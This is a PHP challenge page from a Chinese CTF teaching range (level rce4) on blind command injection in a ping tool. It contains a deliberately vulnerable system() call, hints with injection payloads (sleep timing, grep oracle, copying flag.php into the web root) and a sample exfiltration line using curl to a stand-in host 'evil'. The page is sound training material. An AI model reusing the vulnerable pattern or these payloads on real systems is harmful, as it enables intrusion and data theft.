<?php
// ============================================================
// rce4 · 无回显命令注入（盲注）
// 漏洞：输出被重定向到 /dev/null，页面只回"完成 + 耗时"
// 考点：时间盲注（sleep）、带外落盘（cp/cat > 文件再访问）
// ============================================================
$ip_param = isset($_GET['ip']) ? $_GET['ip'] : '';
$done = false; $elapsed = 0.0;
if ($ip_param !== '') {
    $t0 = microtime(true);
    system('ping -c 1 ' . $ip_param . ' > /dev/null 2>&1');   // ← 输出被丢弃
    $elapsed = microtime(true) - $t0;
    $done = true;
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>rce4 · 无回显命令注入 | CTF 教学靶场</title>
<style>
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#0ea5e9;color:#04121f;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
input[type=text]{width:65%;min-width:220px;padding:8px 10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink)}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer}
button:hover{filter:brightness(1.15)}
.okbox{background:#052e1a;border:1px solid #14532d;color:#86efac;border-radius:8px;padding:10px 14px;margin-top:12px}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
table{border-collapse:collapse;width:100%;font-size:14px}td,th{border:1px solid #334155;padding:6px 10px;text-align:left}th{color:var(--acc)}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
</style>
</head>
<body>
<div class="wrap">
<header>
<span class="badge">RCE · 命令注入 · 第 4 关</span>
<h1>Ping 诊断工具 v4 —— 无回显（盲注）</h1>
<div class="meta">难度：★★★☆☆ 进阶 | 关卡 ID：<code>rce4</code> · 运行时：PHP</div>
</header>

<section class="card">
<h2>题目描述</h2>
<p>被打穿了三次之后，运维把工具改成"静默模式"：<b>命令照跑，但任何输出都直接丢弃</b>（重定向到 /dev/null），页面只告诉你"诊断完成"和<b>耗时多少秒</b>。</p>
<p>注入点还在。但现在你看不到 <code>cat</code> 的输出了——目标依然是拿到 <code>flag.php</code> 里的 flag。</p>
</section>

<section class="card">
<h2>实验区</h2>
<form method="get" action="">
<label>目标 IP：<input type="text" name="ip" placeholder="例如 127.0.0.1" value="<?= htmlspecialchars($ip_param, ENT_QUOTES) ?>"></label>
<button type="submit">开始诊断</button>
</form>
<?php if ($done): ?>
<div class="okbox">✅ 诊断完成，耗时 <?= sprintf('%.2f', $elapsed) ?> 秒。</div>
<?php endif; ?>
</section>

<section class="card">
<h2>知识点讲解</h2>
<p>本关代码：</p>
<pre>&lt;?php
system('ping -c 1 ' . $ip . ' &gt; /dev/null 2&gt;&amp;1');   // 输出全部丢弃
echo '耗时', round(microtime(true) - $t0, 2), '秒';
?&gt;</pre>
<p><b>无回显 ≠ 无危害</b>。没有输出通道时，攻击者会换一条信道：</p>
<table>
<tr><th>信道</th><th>做法</th><th>本关可用性</th></tr>
<tr><td>时间（盲注）</td><td><code>sleep 5</code> 拉长耗时；用 <code>if 条件; then sleep 3; fi</code> 把"判断"变成"耗时差异"</td><td>✅ 页面显示耗时</td></tr>
<tr><td>写文件（带外落盘）</td><td><code>cp flag.php out.txt</code> / <code>cat flag.php|tee out.txt</code>，把结果落到 web 目录，再用 HTTP 访问</td><td>✅ 需要 web 目录可写</td></tr>
<tr><td>HTTP/DNS 外带</td><td><code>curl http://evil/?d=$(cat flag.php)</code>、DNSlog 子域名编码外带</td><td>需出网，靶场离线时不可用（真实场景常见）</td></tr>
</table>
<p>盲注的通用套路：<b>把"数据"转成"可观察的信号"</b>——耗时、文件出现与否、外部请求到达与否。</p>
</section>

<section class="card">
<h2>渐进提示</h2>
<details><summary>提示 1：先证明注入还在</summary><p>提交 <code>?ip=127.0.0.1;sleep 5</code>，看页面"耗时"是不是变成 5 秒多。耗时本身就是输出通道。</p></details>
<details><summary>提示 2：构造布尔 oracle</summary><p>试试 <code>?ip=127.0.0.1;if grep -q rce4 flag.php;then sleep 4;fi</code>——耗时 4 秒说明文件里有 rce4 字样。真实盲注就是把这种判断细化到每个字符。</p></details>
<details><summary>提示 3：把结果"搬"到能看的地方</summary><p>web 目录对服务器进程可写：<code>?ip=127.0.0.1;cp flag.php out.txt</code>，然后直接访问 <code>/rce4/out.txt</code>。<br>⚠️ 细节坑：本程序在命令<b>末尾</b>自带 <code>&gt;/dev/null</code>，你自己写的 <code>&gt;o.txt</code> 会被它覆盖（o.txt 是空的），所以要么用不依赖 stdout 的 <code>cp</code>，要么用 <code>?ip=127.0.0.1;cat flag.php|tee o.txt</code>。</p></details>
</section>

<section class="card">
<h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button>
</form>
<div id="flagResult"></div>
</section>

<nav class="nav"><a href="../rce3">← 上一关：rce3</a><a href="../rce5">下一关：rce5 · eval 代码执行 →</a></nav>
<footer>CTF Web 教学式靶场 · B 组 · 仅用于安全学习</footer>
</div>
<script>
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=rce4&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script>
</body>
</html>
